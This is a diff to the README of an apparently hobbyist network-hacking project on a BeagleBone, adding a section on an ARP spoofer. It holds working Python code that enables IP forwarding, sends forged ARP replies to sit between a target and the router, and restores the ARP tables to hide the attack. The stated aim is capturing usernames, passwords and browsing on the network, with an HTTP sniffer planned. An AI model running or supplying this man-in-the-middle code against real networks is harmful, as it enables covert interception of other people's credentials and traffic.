@@ -446,4 +446,39 @@ At the moment the sniffer is quite basic but could still yield some useful info.
 ### But why?
 Seeing how often devices communicate and who talks to who on a network could provide us with some good information on mapping the network out. We may be able to tell which devices are the most active etc. 
 
+## ARP Spoofer:
+This ARP spoofer redirects the network traffic to the us by faking the IP address.
+So we can impersonate someone on the network and listen in perhaps...
+Once this works, the router will send the data to the beaglebone instead of the system, and the system will send the data to the beaglebone instead of the router.
 
+```python
+def enable_linux_iproute():
+        print("Enabling ip routing...")
+        file_path="/proc/sys/net/ipv4/ip_forward"
+        with open(file_path) as f:
+                if f.read()==1:
+                         return
+        with open(file_path,'w') as f:
+                f.write('1')
+
+def spoof(target_ip,host_ip,target_mac):
+        arp_response = ARP(pdst=target_ip, hwdst=target_mac,psrc=host_ip, op='is-at')
+        send(arp_response)
+        print("Sent to " + str(target_ip) +" -> " + str(host_ip))
+
+def restore(target_ip,host_ip,target_mac,host_mac):
+        arp_response= ARP(pdst=target_ip,hwdst=target_mac,psrc=host_ip,hwsrc=host_mac)
+        send(arp_response,count=7)
+        print("Sent to : " + str(target_ip) + " -> " + str(host_ip))
+        
+```
+
+- First we enable iproute on our beaglebone, IP forwarding is the ability for an operating system to accept incoming network packets on one interface, recognize that it is not meant for the system itself, but that it should be passed on to another network, and then forwards it accordingly.
+
+- The spoof function is where the actual arp spoofing takes place. It gets the MAC address of the target, crafts the ARP response packet and then sends it.
+
+- Once we want to stop the attack, we need to re-assign the real addresses to target device. In order to ensure it isn't obvious that something bad has happened, we send seven legitimate ARP reply packets so no one is disconnected from the network. 
+
+### But why?
+This arp spoofer allows us to listen to what is being sent on the network, we may be able to sniff some info such as usernames/passwords or websites visited etc. 
+I am currently making a http packet sniffer to use once an arp spoof has taken place but it needs testing...
